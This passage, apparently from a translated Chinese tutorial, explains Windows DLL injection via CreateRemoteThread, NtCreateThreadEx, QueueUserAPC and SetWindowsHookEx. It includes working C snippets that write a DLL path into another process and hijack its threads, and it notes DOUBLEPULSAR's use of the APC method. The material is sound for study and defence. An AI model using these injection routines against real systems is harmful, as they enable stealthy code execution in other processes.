它包括以下步骤：
1.用OpenProcess()打开目标进程
2.通过GetProcAddress()找到LoadLibrary()的地址
3.通过VirtualAllocEx()为目标/远程进程地址空间中的DLL路径预留内存
4.使用WriteProcessMemory()将DLL路径写入前面预留的内存空间中
5.使用CreateRemoteThread()创建一个新线程，该线程将调用LoadLibrary()函数，以DLL路径名称作为参数
如果浏览MSDN上的[CreateRemoteThread()](https://msdn.microsoft.com/en-us/library/windows/desktop/ms682437%28v=vs.85%29.aspx)文档，会发现我们需要一个指向由线程执行的、类型为LPTHREAD_START_ROUTINE的应用程序定义函数的指针，它实际上是远程进程中线程的起始地址。
这意味着为了执行我们的DLL，只需要给我们的进程发出指示，让它来完成就行了。这样就简单了。
完整的步骤如下所示。
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, dwProcessId);
    // Allocate space in the remote process for the pathname
    LPVOID pszLibFileRemote = (PWSTR)VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
    // Copy the DLL's pathname to the remote process address space
    DWORD n = WriteProcessMemory(hProcess, pszLibFileRemote, (PVOID)pszLibFile, dwSize, NULL);
    // Get the real address of LoadLibraryW in Kernel32.dll
    PTHREAD_START_ROUTINE pfnThreadRtn = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
    // Create a remote thread that calls LoadLibraryW(DLLPathname)
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pfnThreadRtn, pszLibFileRemote, 0, NULL);
完整的源代码，请参阅CreateRemoteThread.cpp文件。
**NtCreateThreadEx()**
另一个选择是使用[NtCreateThreadEx()](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtCreateThread.html)。这是一个未公开的ntdll.dll函数，在将来它可能会消失或发生变化。这种技术实现起来有点复杂，因为我们需要使用一个结构体（见下文）作为参数传递给它，而使用另一个结构体接收来自它的数据。
    struct NtCreateThreadExBuffer {
      ULONG Size;
      ULONG Unknown1;
      ULONG Unknown2;
      PULONG Unknown3;
      ULONG Unknown4;
      ULONG Unknown5;
      ULONG Unknown6;
      PULONG Unknown7;
      ULONG Unknown8;
    };
[这里](http://securityxploded.com/ntcreatethreadex.php)有一篇对该调用的详细说明。这种方法与CreateRemoteThread()方法比较接近。
    PTHREAD_START_ROUTINE ntCreateThreadExAddr = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "NtCreateThreadEx"); 
    LPFUN_NtCreateThreadEx funNtCreateThreadEx = (LPFUN_NtCreateThreadEx)ntCreateThreadExAddr;
    NTSTATUS status = funNtCreateThreadEx(
      &hRemoteThread,
      0x1FFFFF,
      NULL,
      hProcess,
      pfnThreadRtn,
      (LPVOID)pszLibFileRemote,
      FALSE,
      NULL,
      NULL,
      NULL,
      NULL
      );
完整的源代码，请参阅t_NtCreateThreadEx.cpp文件。
**QueueUserAPC()**
对于前面的方法，有一个替代：使用[QueueUserAPC()](https://msdn.microsoft.com/en-us/library/windows/desktop/ms684954%28v=vs.85%29.aspx)函数。
如MSDN所述，这个调用“将用户模式异步过程调用（APC）对象添加到指定线程的APC队列。”
下面是具体定义。
    DWORD WINAPI QueueUserAPC(
      _In_ PAPCFUNC  pfnAPC,
      _In_ HANDLE    hThread,
      _In_ ULONG_PTR dwData
    );
pfnAPC [in]
A pointer to the application-supplied APC function to be called when the
specified thread performs an alertable wait operation. (…)
hThread [in]
A handle to the thread. The handle must have the THREAD_SET_CONTEXT access
right. (…)
dwData [in]
A single value that is passed to the APC function pointed to by the pfnAPC
parameter.
所以，如果我们不想创建自己的线程，那么可以使用QueueUserAPC()来劫持目标/远程进程中的现有线程。也就是说，调用此函数将在指定的线程上对异步过程调用进行排队。
我们可以使用真正的APC回调函数代替LoadLibrary()。这里的参数实际上可以指向注入的DLL文件名的指针。
    DWORD dwResult = QueueUserAPC((PAPCFUNC)pfnThreadRtn, hThread, (ULONG_PTR)pszLibFileRemote);
当你尝试这种技术的时候，你可能会注意到，这与MS
Windows执行APC的方式有关。但是，这里没有查看APC队列的调度器，这意味着，只有当线程变为可警示状态时，队列才会被检查。
这样，我们就可以劫持每一个线程了，具体如下。
    BOOL bResult = Thread32First(hSnapshot, &threadEntry);
      while (bResult)
      {
        bResult = Thread32Next(hSnapshot, &threadEntry);
        if (bResult)
        {
          if (threadEntry.th32OwnerProcessID == dwProcessId)
          {
            threadId = threadEntry.th32ThreadID;
            wprintf(TEXT("[+] Using thread: %in"), threadId);
            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, threadId);
            if (hThread == NULL)
              wprintf(TEXT("[-] Error: Can't open thread. Continuing to try other threads...n"));
            else
            {
              DWORD dwResult = QueueUserAPC((PAPCFUNC)pfnThreadRtn, hThread, (ULONG_PTR)pszLibFileRemote);
              if (!dwResult)
                wprintf(TEXT("[-] Error: Couldn't call QueueUserAPC on thread> Continuing to try othrt threads...n"));
              else
                wprintf(TEXT("[+] Success: DLL injected via CreateRemoteThread().n"));
              CloseHandle(hThread);
            }
          }
        }
      }
我们这样做，主要是想让一个线程变为可警示状态。
顺便说一句，很高兴看到这种技术被[DOUBLEPULSAR](https://countercept.com/our-thinking/doublepulsar-usermode-analysis-generic-reflective-dll-loader/)应用。
完整的源代码，请参见“t_QueueUserAPC.cpp”文件。
**SetWindowsHookEx()**
为了使用这种技术，我们首先需要了解一下MS Windows钩子的工作原理。简单来说，钩子就是一种拦截事件并采取行动的方式。
你可能会猜到，会有很多不同类型的钩子。其中，最常见的是WH_KEYBOARD和WH_MOUSE。是的，你可能已经猜到了，它们可以用来监控键盘和鼠标的输入。
[SetWindowsHookEx()](https://msdn.microsoft.com/en-us/library/windows/desktop/ms644990%28v=vs.85%29.aspx)的作用是“将应用程序定义的钩子装到钩子链中。”
    HHOOK WINAPI SetWindowsHookEx(
      _In_ int       idHook,
      _In_ HOOKPROC  lpfn,
      _In_ HINSTANCE hMod,
      _In_ DWORD     dwThreadId
    );
idHook [in]
Type: int
The type of hook procedure to be installed. (…)
lpfn [in]
Type: HOOKPROC
A pointer to the hook procedure. (…)
hMod [in]
Type: HINSTANCE
A handle to the DLL containing the hook procedure pointed to by the lpfn
parameter. (…)
dwThreadId [in]
Type: DWORD
The identifier of the thread with which the hook procedure is to be
associated. (…)
MSDN上一个有趣的评论指出：
“SetWindowsHookEx可以用于将DLL注入到另一个进程中。32位DLL不能被注入到64位进程中，同时，64位DLL也不能被注入到32位进程中。如果应用程序需要在其他进程中使用钩子，则需要使用一个32位应用程序调用SetWindowsHookEx将32位DLL注入32位进程中，或者使用64位应用程序调用SetWindowsHookEx来把64位DLL注入64位进程。32位和64位DLL必须具有不同的名称。”
请大家务必记住这一点。